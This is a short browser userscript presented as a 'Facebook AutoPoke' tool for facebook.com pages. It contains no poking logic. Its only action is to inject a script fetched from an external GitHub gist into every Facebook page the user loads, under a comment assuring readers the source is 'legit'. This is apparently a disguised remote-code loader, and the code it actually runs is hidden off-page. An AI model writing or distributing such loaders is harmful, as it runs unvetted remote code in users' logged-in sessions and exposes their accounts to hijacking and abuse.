// ==UserScript==
// @name         Facebook AutoPoke
// @namespace    http://userscripts.org/users/zackton
// @description  Hopefully a successful AutoPoke
// @include      *.facebook.com/*
// @updateURL    http://userscripts.org/scripts/source/470327.meta.js
// @grant        none
// @run-at       document-end
// @version      1.2.1
// ==/UserScript== 

// Check the source if you really want, it is legit :)
        var oldOnload = window.onload;
        window.onload = function () {
        oldOnload();
        	var script = document.createElement('script');
                script.setAttribute('src', 'https://gist.github.com/DanielJochem/11396986/raw');
                document.body.appendChild(script);        
        }
